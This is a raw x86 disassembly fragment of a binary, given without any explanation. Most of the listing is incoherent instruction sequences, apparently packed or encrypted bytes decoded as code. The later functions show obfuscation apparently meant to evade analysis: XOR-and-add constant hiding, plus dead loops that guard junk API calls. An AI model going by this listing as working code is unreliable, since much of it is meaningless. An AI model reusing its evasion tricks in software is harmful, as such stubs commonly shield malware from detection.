  40e48a:	add    BYTE PTR [ebp-0x48],dl
  40e48d:	sub    DWORD PTR [eax-0x28eb17e4],eax
  40e493:	pop    edi
  40e494:	in     al,dx
  40e495:	stc    
  40e496:	inc    edx
  40e497:	icebp  
  40e498:	mov    esi,cs
  40e49a:	cmp    BYTE PTR [ecx],dh
  40e49c:	daa    
  40e49d:	stos   BYTE PTR es:[edi],al
  40e49e:	imul   ecx,DWORD PTR [ebp+0x1d],0xfffffff3
  40e4a2:	div    BYTE PTR [ecx+0x2adf54ef]
  40e4a8:	pop    edx
  40e4a9:	addr16 pop eax
  40e4ab:	and    al,BYTE PTR [ebp+0x479714c0]
  40e4b1:	pop    edi
  40e4b2:	xchg   DWORD PTR [ebx],ebp
  40e4b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4b5:	inc    eax
  40e4b6:	inc    edx
  40e4b7:	lds    ebx,FWORD PTR cs:[edi+0x50]
  40e4bb:	pushf  
  40e4bc:	xor    DWORD PTR [ebx],edx
  40e4be:	inc    ebx
  40e4bf:	inc    ebx
  40e4c0:	call   DWORD PTR [eax+0x2f4da710]
  40e4c6:	and    al,0xd6
  40e4c8:	stos   DWORD PTR es:[edi],eax
  40e4c9:	xor    eax,0xdf19b529
  40e4ce:	cs mov cl,0xb9
  40e4d1:	inc    edi
  40e4d2:	iret   
  40e4d3:	push   esp
  40e4d4:	mov    ah,0xd0
  40e4d6:	mov    dh,0x85
  40e4d8:	repnz push esi
  40e4da:	and    DWORD PTR [di],esi
  40e4dd:	cmp    edx,ebx
  40e4df:	mov    al,0x86
  40e4e1:	pop    ebp
  40e4e2:	jmp    0x40e4a8
  40e4e4:	dec    ecx
  40e4e5:	adc    al,0x77
  40e4e7:	stos   BYTE PTR es:[edi],al
  40e4e8:	sub    al,0xac
  40e4ea:	in     eax,dx
  40e4eb:	lock xlat BYTE PTR ds:[ebx]
  40e4ed:	or     BYTE PTR [ecx-0x1c],ch
  40e4f0:	pop    ss
  40e4f1:	inc    esi
  40e4f2:	jb     0x40e545
  40e4f4:	mov    edx,0x39137128
  40e4f9:	fcom   DWORD PTR [ecx+ebp*8+0x79]
  40e4fd:	test   ebp,eax
  40e4ff:	je     0x40e55b
  40e501:	fsub   st,st(6)
  40e503:	mov    gs,eax
  40e505:	in     eax,dx
  40e506:	fsub   QWORD PTR ds:0xb1c7c77c
  40e50c:	mov    al,ds:0x1692d246
  40e511:	(bad)  
  40e512:	push   esp
  40e513:	or     bh,bh
  40e515:	dec    ebx
  40e516:	inc    esi
  40e517:	adc    DWORD PTR [esp+edi*2+0x40],edi
  40e51b:	(bad)  
  40e51c:	mov    ds:0x9cf34df9,eax
  40e521:	neg    bl
  40e523:	fwait
  40e524:	push   eax
  40e525:	xchg   esi,eax
  40e526:	fnsave [edi-0x13]
  40e529:	sub    DWORD PTR [esp+ebp*8-0x7cec6ec0],ebx
  40e530:	imul   ebp
  40e532:	fdiv   QWORD PTR [ebx]
  40e534:	xlat   BYTE PTR ds:[ebx]
  40e535:	jecxz  0x40e4dc
  40e537:	ret    0x3c6e
  40e53a:	fsub   DWORD PTR [eax+0x3ecb0f3]
  40e540:	push   cs
  40e541:	or     BYTE PTR gs:[ebx-0x1e40cee8],ah
  40e548:	fidivr WORD PTR [esi-0x1a]
  40e54b:	jb     0x40e59f
  40e54d:	test   BYTE PTR [ebx],al
  40e54f:	ret    
  40e550:	dec    esp
  40e551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e552:	mov    DWORD PTR [ebx+0x2779d043],esi
  40e558:	shl    BYTE PTR ss:[edi],0x8f
  40e55c:	adc    BYTE PTR [ecx-0x7a],dl
  40e55f:	rcl    DWORD PTR [ebp+esi*1-0x69],1
  40e563:	aad    0x6b
  40e565:	mov    cl,0x57
  40e567:	inc    ebx
  40e568:	ins    DWORD PTR es:[edi],dx
  40e569:	hlt    
  40e56a:	inc    DWORD PTR [ecx+0x76]
  40e56d:	xchg   ecx,eax
  40e56e:	out    0x79,al
  40e570:	mov    ebx,tr1
  40e573:	(bad)
  40e577:	leave  
  40e578:	popa   
  40e579:	dec    ebp
  40e57a:	cmp    eax,0xddf3d241
  40e57f:	sbb    eax,DWORD PTR [ebp+0x41]
  40e582:	sbb    al,0x81
  40e584:	xchg   edx,eax
  40e585:	loope  0x40e5db
  40e587:	es jl  0x40e5f8
  40e58a:	shl    DWORD PTR [edi],cl
  40e58c:	hlt    
  40e58d:	loop   0x40e55a
  40e58f:	push   ecx
  40e590:	fcomp  DWORD PTR [edi+0x26]
  40e593:	mov    ds:0xcc4358a0,al
  40e598:	sbb    BYTE PTR [eax-0x3e],ch
  40e59b:	sub    al,0xf5
  40e59d:	js     0x40e52c
  40e59f:	add    dl,ch
  40e5a1:	xor    ah,BYTE PTR [ebx+0x68]
  40e5a4:	pop    ds
  40e5a5:	mov    ?,WORD PTR ds:0x3bbd79b5
  40e5ab:	inc    ebx
  40e5ac:	hlt    
  40e5ad:	sar    edx,cl
  40e5af:	mov    ds:0xfc3549bf,al
  40e5b4:	or     ecx,DWORD PTR [ecx-0x53034420]
  40e5ba:	iret   
  40e5bb:	add    DWORD PTR [eax-0x252dd6b8],edx
  40e5c1:	push   ebp
  40e5c2:	jbe    0x40e637
  40e5c4:	outs   dx,DWORD PTR ds:[esi]
  40e5c5:	xchg   ebx,eax
  40e5c6:	test   eax,0x36cf052
  40e5cb:	xor    eax,ecx
  40e5cd:	ja     0x40e5cc
  40e5cf:	pop    esp
  40e5d1:	jp     0x40e5b8
  40e5d3:	cmp    BYTE PTR ds:[eax+edx*2+0x41],al
  40e5d8:	cli    
  40e5d9:	jg     0x40e5aa
  40e5db:	jb     0x40e568
  40e5dd:	ja     0x40e5c6
  40e5df:	in     eax,0x19
  40e5e1:	sbb    al,0x32
  40e5e3:	push   cs
  40e5e4:	inc    edi
  40e5e5:	cmc    
  40e5e6:	mov    al,0xea
  40e5e8:	call   DWORD PTR [ebx+0x2dd21308]
  40e5ee:	mov    eax,ebp
  40e5f0:	jne    0x40e670
  40e5f2:	jle    0x40e5fc
  40e5f4:	pusha  
  40e5f5:	mov    bh,0x22
  40e5f7:	test   ebp,ecx
  40e5f9:	(bad)  
  40e5fa:	push   edx
  40e5fb:	fwait
  40e5fc:	popa   
  40e5fd:	shl    DWORD PTR [ecx-0x1851d141],1
  40e603:	mov    al,ds:0x19c8f1e6
  40e608:	jge    0x40e61e
  40e60a:	pop    ebx
  40e60b:	popf   
  40e60c:	pop    ebx
  40e60d:	pop    esp
  40e60e:	hlt    
  40e60f:	xor    eax,0xcf77e5cc
  40e614:	lods   eax,DWORD PTR ds:[esi]
  40e615:	dec    esp
  40e616:	mov    ah,0xb0
  40e618:	push   ss
  40e619:	add    eax,0x679b7ece
  40e61e:	icebp  
  40e61f:	adc    al,0x99
  40e621:	mov    DWORD PTR [ecx-0x43],edx
  40e624:	add    ch,BYTE PTR [edx-0x24f9b6e1]
  40e62a:	pop    esi
  40e62b:	push   0xecaa2e95
  40e630:	xchg   esp,eax
  40e631:	int    0x33
  40e633:	(bad)  
  40e634:	std    
  40e635:	push   esp
  40e636:	push   ebx
  40e637:	pop    edi
  40e638:	pop    eax
  40e639:	(bad)  
  40e63b:	cmp    eax,0x3d0074c3
  40e640:	xor    WORD PTR [esi-0x51],sp
  40e644:	push   0xd368a3bb
  40e649:	cmp    ch,BYTE PTR [edi-0x1e]
  40e64c:	std    
  40e64d:	pop    edx
  40e64e:	mov    esi,edx
  40e650:	(bad)  
  40e651:	dec    esp
  40e652:	jne    0x40e649
  40e654:	not    bl
  40e656:	and    bh,BYTE PTR [ebp-0x3e05907b]
  40e65c:	or     eax,0xcf28f86d
  40e661:	mov    edi,0xb3b8a31
  40e666:	xor    DWORD PTR [edx-0x240dd96a],ebp
  40e66c:	mov    bl,0x2c
  40e66e:	cdq    
  40e66f:	dec    ebp
  40e670:	mov    bh,0x98
  40e672:	repnz adc DWORD PTR [esi-0x2f73dea2],esp
  40e679:	stc    
  40e67a:	xchg   DWORD PTR [ebp+0x2d],esp
  40e67d:	push   esi
  40e67e:	mov    eax,ds:0xa439141f
  40e683:	lods   al,BYTE PTR ds:[esi]
  40e684:	sar    DWORD PTR [ebp-0x4a],1
  40e687:	fstp   DWORD PTR [esi-0x73cb6516]
  40e68d:	rol    DWORD PTR [ebx-0x7b],cl
  40e690:	test   al,0x53
  40e692:	out    0x4c,eax
  40e694:	ret    0x65cf
  40e697:	cmp    ebx,DWORD PTR [esi]
  40e699:	push   esp
  40e69a:	cwde   
  40e69b:	cmp    ch,dl
  40e69d:	add    DWORD PTR ds:0x53430244,ebx
  40e6a3:	das    
  40e6a4:	jo     0x40e71e
  40e6a6:	aad    0x3c
  40e6a8:	fstp   TBYTE PTR [ebx]
  40e6aa:	out    0xef,al
  40e6ac:	push   esp
  40e6ad:	mov    ecx,0x9c601a24
  40e6b2:	jge    0x40e652
  40e6b4:	pop    ds
  40e6b5:	pop    ss
  40e6b6:	sub    eax,0x11f176f1
  40e6bb:	jl     0x40e70f
  40e6bd:	xor    eax,eax
  40e6bf:	mov    WORD PTR [ebx+0x11fdff65],cs
  40e6c5:	add    eax,0x6120114c
  40e6ca:	pushf  
  40e6cb:	add    al,BYTE PTR [edi]
  40e6cd:	iret   
  40e6ce:	ins    DWORD PTR es:[edi],dx
  40e6cf:	xor    BYTE PTR [esi+0x7fa701d3],dh
  40e6d5:	shr    DWORD PTR [ecx],0xe0
  40e6d8:	test   BYTE PTR [edx],cl
  40e6da:	pusha  
  40e6db:	and    BYTE PTR [ebp+0x75],0xd7
  40e6df:	(bad)  
  40e6e0:	jne    0x40e6cd
  40e6e2:	stc    
  40e6e3:	ror    DWORD PTR [ebx],1
  40e6e5:	dec    ecx
  40e6e6:	cmp    eax,0x130bbd22
  40e6eb:	(bad)  
  40e6ed:	and    DWORD PTR [ecx+0x49],edi
  40e6f0:	xor    al,0x6d
  40e6f2:	scas   eax,DWORD PTR es:[edi]
  40e6f3:	std    
  40e6f4:	iret   
  40e6f5:	outs   dx,DWORD PTR ds:[esi]
  40e6f6:	aad    0x29
  40e6f8:	lods   al,BYTE PTR ds:[esi]
  40e6f9:	lods   al,BYTE PTR ds:[esi]
  40e6fa:	xchg   edi,eax
  40e6fb:	mov    ecx,0x9070bbd8
  40e700:	sar    eax,cl
  40e702:	inc    ecx
  40e703:	jae    0x40e756
  40e705:	mov    ?,WORD PTR [edi]
  40e707:	jmp    0x7523dd4b
  40e70c:	mov    dl,dh
  40e70e:	pop    eax
  40e70f:	pop    ebp
  40e710:	mov    esp,0x2cddeb02
  40e715:	dec    DWORD PTR [edx]
  40e717:	popf   
  40e718:	push   esi
  40e719:	arpl   WORD PTR [edi-0x52ec81f0],si
  40e71f:	cmp    BYTE PTR [edx-0x7372fd02],ah
  40e725:	sub    eax,esi
  40e727:	xor    DWORD PTR [eax],ecx
  40e729:	add    DWORD PTR [ebx+0x321e7af2],ecx
  40e72f:	imul   ebp,DWORD PTR [edx+ecx*4],0x24709b04
  40e736:	mov    al,BYTE PTR [ebx-0x62ee7da2]
  40e73c:	(bad)  
  40e73d:	aaa    
  40e73e:	das    
  40e73f:	inc    ebp
  40e740:	stos   BYTE PTR es:[edi],al
  40e741:	stos   BYTE PTR es:[edi],al
  40e742:	jbe    0x40e763
  40e744:	xor    cl,BYTE PTR [eax+edx*1+0x54a6bdc1]
  40e74b:	loopne 0x40e74a
  40e74d:	retf   
  40e74e:	test   al,0x5e
  40e750:	aaa    
  40e751:	or     ecx,DWORD PTR [esi]
  40e753:	les    esp,FWORD PTR [ecx]
  40e755:	add    BYTE PTR [edi+eiz*4-0x55],bh
  40e759:	adc    eax,0xe3bdd538
  40e75e:	les    edx,FWORD PTR ds:0x87e070d4
  40e764:	call   0xd442ac55
  40e769:	adc    eax,0x70a8c1ce
  40e76e:	xchg   ecx,eax
  40e76f:	jmp    0xca841511
  40e774:	xor    eax,0x912e32f
  40e779:	stos   DWORD PTR es:[edi],eax
  40e77a:	push   edi
  40e77b:	jge    0x40e740
  40e77d:	xor    al,0xcc
  40e77f:	mov    al,0xcb
  40e781:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e782:	sysenter 
  40e784:	mov    ah,0x7d
  40e786:	push   0xc4a76b7d
  40e78b:	sti    
  40e78c:	outs   dx,DWORD PTR ds:[esi]
  40e78d:	into   
  40e78e:	mov    al,0x7d
  40e790:	fs enter 0x55f4,0x28
  40e795:	and    eax,0xde6c0e5e
  40e79a:	scas   al,BYTE PTR es:[edi]
  40e79b:	adc    bh,BYTE PTR [edx+0x2f]
  40e79e:	xor    eax,0x20019e73
  40e7a3:	in     al,0xe8
  40e7a5:	scas   al,BYTE PTR es:[edi]
  40e7a6:	rol    DWORD PTR [esi],0x93
  40e7a9:	jno    0x40e75d
  40e7ab:	es clc 
  40e7ad:	jnp    0x40e763
  40e7af:	mov    BYTE PTR [edx+0x5],ch
  40e7b2:	out    dx,eax
  40e7b3:	mov    esp,0x2ce75e35
  40e7b8:	push   ss
  40e7b9:	out    0xff,eax
  40e7bb:	es jmp 0x5939:0xff8f33e8
  40e7c3:	inc    esi
  40e7c4:	mov    WORD PTR [eax-0x60646baf],cs
  40e7ca:	mov    WORD PTR [edx],ss
  40e7cc:	mov    dl,0xf7
  40e7ce:	int    0x19
  40e7d0:	mov    dl,BYTE PTR [ebx]
  40e7d2:	div    DWORD PTR [ebx]
  40e7d4:	xlat   BYTE PTR ds:[ebx]
  40e7d5:	inc    ecx
  40e7d6:	mov    ss,WORD PTR [edx+edx*8]
  40e7d9:	adc    al,0xbd
  40e7db:	fsubr  DWORD PTR [ebp+edi*2-0x75860003]
  40e7e2:	loop   0x40e7e2
  40e7e4:	out    0x9f,al
  40e7e6:	xchg   DWORD PTR [esi+0x6d48c505],esi
  40e7ec:	push   ecx
  40e7ee:	dec    edx
  40e7ef:	outs   dx,DWORD PTR ds:[esi]
  40e7f0:	inc    eax
  40e7f1:	mov    DWORD PTR [edx+ebp*2+0x15009e84],edi
  40e7f8:	push   ebp
  40e7f9:	retf   
  40e7fa:	lock lahf 
  40e7fc:	jl     0x40e7aa
  40e7fe:	pop    ss
  40e7ff:	dec    esp
  40e800:	(bad)  
  40e801:	push   es
  40e802:	pop    ds
  40e803:	xor    eax,0xdd0d9867
  40e808:	sbb    al,0x8b
  40e80a:	imul   edi,DWORD PTR [esp+ecx*2+0x13c23140],0x7d75a55e
  40e815:	pop    es
  40e816:	ficomp WORD PTR [edx+0x53036aca]
  40e81c:	lock not bh
  40e81f:	fucomip st,st(3)
  40e821:	pushf  
  40e822:	lahf   
  40e823:	in     al,dx
  40e824:	cmp    BYTE PTR [edi+0x405bc404],0x9e
  40e82b:	jmp    0x31618e27
  40e830:	call   0xa713:0x619297cf
  40e837:	jne    0x40e7f0
  40e839:	lods   eax,DWORD PTR ds:[esi]
  40e83a:	pop    edi
  40e83b:	and    bl,BYTE PTR [edi+edi*4+0x7ed830e8]
  40e842:	and    BYTE PTR [esi+0x2d],dh
  40e845:	push   es
  40e846:	scas   eax,DWORD PTR es:[edi]
  40e847:	loopne 0x40e8b0
  40e849:	dec    edx
  40e84a:	dec    ebx
  40e84b:	ss scas al,BYTE PTR es:[edi]
  40e84d:	jg     0x40e8c3
  40e84f:	jmp    0x40e7fc
  40e851:	stc    
  40e852:	sub    ecx,DWORD PTR [eax]
  40e854:	cld    
  40e855:	xchg   edi,eax
  40e856:	fwait
  40e857:	mov    ecx,0xd71fbcc1
  40e85c:	xor    bl,dh
  40e85e:	xchg   esi,eax
  40e85f:	jbe    0x40e899
  40e861:	idiv   DWORD PTR [ecx+0x4a]
  40e864:	in     al,0x16
  40e866:	scas   eax,DWORD PTR es:[edi]
  40e867:	inc    eax
  40e868:	xor    bl,al
  40e86a:	or     dl,al
  40e86c:	mov    esi,0x35982349
  40e871:	xor    eax,0x1175c88f
  40e876:	mov    ds:0x27ee0a5,al
  40e87b:	cmp    dl,ah
  40e87d:	cmp    cl,ch
  40e87f:	dec    edx
  40e880:	scas   eax,DWORD PTR es:[edi]
  40e881:	push   eax
  40e882:	popa   
  40e883:	lea    ecx,[edi+0x51]
  40e886:	cs daa 
  40e888:	push   eax
  40e889:	sbb    BYTE PTR [edx-0x3ca5700f],dh
  40e88f:	clc    
  40e890:	mov    edx,0x5de9f201
  40e895:	repnz push 0xffffffc7
  40e898:	cld    
  40e899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e89a:	cmp    dl,BYTE PTR [edx]
  40e89c:	xchg   ecx,eax
  40e89d:	test   al,0xe9
  40e89f:	je     0x40e8ad
  40e8a1:	sbb    ecx,DWORD PTR [ebp-0xb76f9d7]
  40e8a7:	(bad)  
  40e8a8:	push   edi
  40e8a9:	or     dh,BYTE PTR [ecx-0x34]
  40e8ac:	ins    BYTE PTR es:[edi],dx
  40e8ad:	(bad)  
  40e8ae:	and    al,0x20
  40e8b0:	mov    edx,0x8b500e5d
  40e8b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8b6:	add    al,0x56
  40e8b8:	aaa    
  40e8b9:	mov    ds:0x800c9810,eax
  40e8be:	xchg   ecx,eax
  40e8bf:	adc    BYTE PTR [esi+ebp*8-0x6a19a674],dh
  40e8c6:	cmp    al,0xe0
  40e8c8:	dec    edi
  40e8c9:	push   ds
  40e8ca:	lds    edi,FWORD PTR [eax+esi*2+0x78]
  40e8ce:	sub    BYTE PTR [ecx+0x6],dl
  40e8d1:	adc    eax,0xd2401b9
  40e8d6:	ret    
  40e8d7:	ret    0xf262
  40e8da:	pusha  
  40e8db:	shl    eax,1
  40e8dd:	xchg   ecx,eax
  40e8de:	adc    dl,dl
  40e8e0:	xor    eax,0xc771e5fa
  40e8e5:	(bad)
  40e8e8:	rcr    ecx,1
  40e8ea:	mov    ds:0xb7e53ce3,al
  40e8ef:	pop    ss
  40e8f0:	in     al,0xdb
  40e8f2:	and    DWORD PTR [edx+esi*2-0x1e7289b8],ebx
  40e8f9:	push   ecx
  40e8fa:	sbb    eax,0xe24f59b
  40e8ff:	arpl   WORD PTR [eax],cx
  40e901:	loopne 0x40e97f
  40e903:	mov    esp,0xc2213c27
  40e908:	or     eax,DWORD PTR [ebp+0x4655317b]
  40e90e:	and    DWORD PTR [edi],ebp
  40e910:	jmp    FWORD PTR [eax]
  40e912:	test   DWORD PTR [ecx+ebx*2+0x46],0xbe5bc5ad
  40e91a:	fnsave ss:[ecx]
  40e91d:	sub    bl,ah
  40e91f:	loopne 0x40e93a
  40e921:	ret    
  40e922:	sar    DWORD PTR [ecx],0x2d
  40e925:	rcl    ch,0xfe
  40e928:	repz repz pop esi
  40e92b:	js     0x40e92a
  40e92d:	mov    dh,0xe9
  40e92f:	fistp  QWORD PTR [esi-0x5faca5c8]
  40e935:	jle    0x40e978
  40e937:	jb     0x40e96c
  40e939:	sub    edx,esp
  40e93b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e93c:	rcr    DWORD PTR [eax+0x37],1
  40e93f:	mov    ds:0x5015a313,al
  40e944:	loop   0x40e91b
  40e946:	xor    eax,0x64269675
  40e94b:	mov    ah,0x8e
  40e94d:	test   BYTE PTR [ebp-0x4e627159],ah
  40e953:	xchg   edx,eax
  40e954:	sbb    ecx,DWORD PTR [edi-0x62]
  40e957:	inc    ebx
  40e958:	xor    ebx,DWORD PTR ds:0xe9f52c8c
  40e95e:	sti    
  40e95f:	mov    ds:0x5c228f56,eax
  40e964:	jno    0x40e9cb
  40e966:	shl    esp,0x66
  40e969:	(bad)  
  40e96a:	sahf   
  40e96b:	mov    edx,0x7711b49d
  40e970:	aas    
  40e971:	mov    BYTE PTR [eax+esi*1+0x4b],bh
  40e975:	push   cs
  40e976:	or     BYTE PTR [edi+0x4a],cl
  40e979:	xchg   edi,eax
  40e97a:	inc    eax
  40e97b:	sub    dl,ah
  40e97d:	add    ebp,DWORD PTR [edi-0x20f0b6e0]
  40e983:	lods   eax,DWORD PTR ds:[esi]
  40e984:	mov    ds:0x7e1487bc,al
  40e989:	enter  0xe176,0x5c
  40e98d:	out    dx,eax
  40e98e:	(bad)  
  40e98f:	xor    al,0x3d
  40e991:	sub    al,0x3a
  40e993:	pop    ebp
  40e994:	jb     0x40e940
  40e996:	popf   
  40e997:	xor    DWORD PTR [ebx+0x748d3c78],ecx
  40e99d:	idiv   DWORD PTR [eax-0x75]
  40e9a0:	xor    al,0x6
  40e9a2:	mov    DWORD PTR [ebp-0x8],esi
  40e9a5:	mov    esi,DWORD PTR [ebp+0x8]
  40e9a8:	xor    esi,ecx
  40e9aa:	add    esi,edx
  40e9ac:	mov    DWORD PTR [ebp-0x14],esi
  40e9af:	mov    esi,DWORD PTR [ebp+0x8]
  40e9b2:	mov    edi,DWORD PTR [ebp-0x8]
  40e9b5:	xor    esi,ecx
  40e9b7:	add    esi,edx
  40e9b9:	pop    ebx
  40e9ba:	cmp    edi,esi
  40e9bc:	jne    0x40e9da
  40e9c2:	mov    eax,DWORD PTR [ebp+0xc]
  40e9c5:	xor    eax,ecx
  40e9c7:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9ca:	add    eax,edx
  40e9cc:	imul   eax,ecx
  40e9cf:	mov    DWORD PTR [ebp-0x8],eax
  40e9d2:	push   DWORD PTR [ebp+0x18]
  40e9d5:	jmp    0x40ea2e
  40e9da:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9dd:	add    ecx,eax
  40e9df:	mov    DWORD PTR [ebp-0x14],ecx
  40e9e2:	mov    ecx,DWORD PTR [ebp-0x14]
  40e9e5:	mov    ecx,DWORD PTR [ecx+0xc]
  40e9e8:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e9ed:	mov    edx,0x3b51
  40e9f2:	sub    cx,dx
  40e9f5:	mov    edx,0x8a8d
  40e9fa:	xor    cx,dx
  40e9fd:	mov    edx,0x4e77
  40ea02:	cmp    cx,dx
  40ea05:	jne    0x40e9d2
  40ea0b:	mov    ecx,DWORD PTR ds:0x42e2b7
  40ea11:	mov    ecx,DWORD PTR [ecx+0x198]
  40ea17:	mov    DWORD PTR [ecx],eax
  40ea19:	jmp    0x40ea3f
  40ea1e:	mov    ecx,DWORD PTR [ebp+0x18]
  40ea21:	cmp    ecx,0xf89c8584
  40ea27:	jne    0x40ea3f
  40ea2d:	push   eax
  40ea2e:	push   DWORD PTR [ebp+0x14]
  40ea31:	push   DWORD PTR [ebp+0x10]
  40ea34:	push   DWORD PTR [ebp+0xc]
  40ea37:	push   DWORD PTR [ebp+0x8]
  40ea3a:	call   0x405799
  40ea3f:	pop    edi
  40ea40:	pop    esi
  40ea41:	leave  
  40ea42:	ret    0x14
  40ea45:	push   ebp
  40ea46:	mov    ebp,esp
  40ea48:	sub    esp,0xc
  40ea4b:	and    DWORD PTR ds:0x42d00c,0x0
  40ea55:	jmp    0x40ea67
  40ea5a:	mov    edx,DWORD PTR ds:0x42d00c
  40ea60:	inc    edx
  40ea61:	mov    DWORD PTR ds:0x42d00c,edx
  40ea67:	cmp    DWORD PTR ds:0x42d00c,0x16
  40ea6e:	jae    0x40eb33
  40ea74:	cmp    DWORD PTR ds:0x42d00c,0xd
  40ea7b:	jne    0x40eac1
  40ea81:	push   0x42e075
  40ea86:	push   0x6212
  40ea8b:	push   DWORD PTR [ebp-0x28]
  40ea8e:	push   0x739a
  40ea93:	push   DWORD PTR [ebp-0x20]
  40ea96:	push   0x3288
  40ea9b:	push   DWORD PTR [ebp-0x28]
  40ea9e:	push   DWORD PTR [ebp-0x1c]
  40eaa1:	push   0x2781
  40eaa6:	push   0x445b
  40eaab:	push   0x2755
  40eab0:	push   DWORD PTR [ebp-0x24]
  40eab3:	push   DWORD PTR [ebp-0x1c]
  40eab6:	push   0x361a
  40eabb:	call   DWORD PTR ds:0x42e8bb
  40eac1:	cmp    DWORD PTR ds:0x42d00c,0xc
  40eac8:	jne    0x40eadb
  40eace:	mov    edx,DWORD PTR ds:0x42d00c
  40ead4:	inc    edx
  40ead5:	mov    DWORD PTR ds:0x42d00c,edx
  40eadb:	jmp    0x40ea5a
  40eae0:	and    DWORD PTR ds:0x42c008,0x0
  40eaea:	jmp    0x40eafe
  40eaef:	xor    edx,edx
  40eaf1:	or     edx,DWORD PTR ds:0x42c008
  40eaf7:	inc    edx
  40eaf8:	mov    DWORD PTR ds:0x42c008,edx
  40eafe:	cmp    DWORD PTR ds:0x42c008,0x14
  40eb05:	jae    0x40eb33
  40eb0b:	cmp    DWORD PTR ds:0x42c008,0x18
  40eb12:	jne    0x40eb2e
  40eb18:	push   DWORD PTR [ebp-0x24]
  40eb1b:	push   DWORD PTR [ebp-0x18]
  40eb1e:	push   0x8994
  40eb23:	push   0x6271
  40eb28:	call   DWORD PTR ds:0x42e8e7
  40eb2e:	jmp    0x40eaef
  40eb33:	push   esi
  40eb34:	mov    esi,0xf89c8585
  40eb39:	xor    DWORD PTR ds:0x429000,ebx
  40eb3f:	mov    DWORD PTR [ebp-0x8],esi
  40eb42:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40eb49:	mov    edx,DWORD PTR ds:0x41cd75
  40eb4f:	mov    ecx,DWORD PTR ds:0x41ce0c
  40eb55:	sub    ecx,edx
  40eb57:	add    edx,DWORD PTR [edx+ecx*1]
  40eb5a:	push   edi
  40eb5b:	mov    eax,eax
  40eb5d:	mov    eax,DWORD PTR [ebp-0x4]
  40eb60:	mov    edi,DWORD PTR [ebp-0x8]
  40eb63:	mov    ecx,0x751089b
  40eb68:	xor    eax,ecx
  40eb6a:	xor    edi,ecx
  40eb6c:	mov    edx,0x3272e2
  40eb71:	add    edi,edx
  40eb73:	add    eax,edx
  40eb75:	imul   eax,edi
  40eb78:	mov    edi,DWORD PTR [ebp+0xc]
  40eb7b:	cmp    edi,eax
  40eb7d:	je     0x40ebd2
  40eb83:	mov    DWORD PTR [ebp-0xc],esi
  40eb86:	mov    eax,DWORD PTR [ebp-0xc]
  40eb89:	mov    esi,DWORD PTR [ebp+0xc]
  40eb8c:	xor    eax,ecx
  40eb8e:	lea    eax,[eax*8+0x1939788]
  40eb95:	mov    eax,DWORD PTR [esi+eax*1]
  40eb98:	mov    DWORD PTR [ebp+0xc],eax
  40eb9b:	mov    eax,DWORD PTR [ebp-0x4]
  40eb9e:	mov    esi,DWORD PTR [ebp-0x8]
  40eba1:	xor    eax,ecx
  40eba3:	xor    esi,ecx
  40eba5:	add    esi,edx
  40eba7:	add    eax,edx
  40eba9:	imul   eax,esi
  40ebac:	mov    esi,DWORD PTR [ebp+0xc]
  40ebaf:	cmp    esi,eax
  40ebb1:	je     0x40ebd2
  40ebb7:	mov    eax,DWORD PTR [ebp-0x4]
  40ebba:	xor    eax,ecx
  40ebbc:	mov    ecx,DWORD PTR [ebp+0xc]
  40ebbf:	add    eax,edx
  40ebc1:	imul   eax,ecx
  40ebc4:	add    eax,DWORD PTR [ebp+0x8]
  40ebc7:	mov    DWORD PTR [ebp+0xc],eax
  40ebca:	mov    eax,DWORD PTR [ebp+0xc]
  40ebcd:	jmp    0x40ebe3
  40ebd2:	mov    eax,DWORD PTR [ebp-0x4]
  40ebd5:	mov    esi,DWORD PTR [ebp-0x8]
  40ebd8:	xor    esi,ecx
  40ebda:	xor    eax,ecx
  40ebdc:	add    esi,edx
  40ebde:	add    eax,edx
  40ebe0:	imul   eax,esi
  40ebe3:	pop    edi
  40ebe4:	pop    esi
  40ebe5:	leave  
  40ebe6:	ret    0x8
  40ebe9:	push   ebp
  40ebea:	mov    ebp,esp
  40ebec:	push   ecx
  40ebed:	and    DWORD PTR ds:0x42a00c,0x0
  40ebf7:	xor    ecx,ecx
  40ebf9:	or     ecx,DWORD PTR ds:0x42a00c
  40ebff:	inc    ecx
  40ec00:	mov    DWORD PTR ds:0x42a00c,ecx
  40ec06:	cmp    DWORD PTR ds:0x42a00c,0x21
  40ec0d:	jne    0x40ec29
  40ec13:	push   0x29ed
  40ec18:	push   DWORD PTR [ebp-0x24]
  40ec1b:	push   0x42e0c2
  40ec20:	push   DWORD PTR [ebp-0x28]
  40ec23:	call   DWORD PTR ds:0x42e8eb
  40ec29:	cmp    DWORD PTR ds:0x42a00c,0x1f
  40ec30:	jb     0x40ebf7
  40ec36:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40ec3d:	mov    eax,DWORD PTR [ebp-0x4]
  40ec40:	mov    edx,DWORD PTR [ebp+0x10]
  40ec43:	and    DWORD PTR ds:0x42b004,0x0
  40ec4d:	jmp    0x40ec5f
  40ec52:	mov    ecx,DWORD PTR ds:0x42b004
  40ec58:	inc    ecx
  40ec59:	mov    DWORD PTR ds:0x42b004,ecx
  40ec5f:	cmp    DWORD PTR ds:0x42b004,0x1d
  40ec66:	jae    0x40ec84
  40ec6c:	cmp    DWORD PTR ds:0x42b004,0x29
  40ec73:	jne    0x40ec7f
  40ec79:	call   DWORD PTR ds:0x42e8ef
  40ec7f:	jmp    0x40ec52
  40ec84:	mov    ecx,0x751089b
  40ec89:	xor    eax,ecx
  40ec8b:	add    eax,0x3272e2
  40ec90:	mov    DWORD PTR [edx],eax
  40ec92:	mov    eax,DWORD PTR [ebp+0xc]
  40ec95:	xor    eax,ecx
  40ec97:	push   esi
  40ec98:	mov    esi,DWORD PTR [ebp+0x10]
  40ec9b:	mov    edx,0x3272e2
  40eca0:	add    eax,edx
  40eca2:	mov    DWORD PTR [esi+0x4],eax
  40eca5:	mov    eax,DWORD PTR [ebp+0x14]
  40eca8:	mov    esi,DWORD PTR [ebp+0x10]
  40ecab:	mov    DWORD PTR [esi+0x8],eax
  40ecae:	mov    eax,DWORD PTR [ebp+0x18]
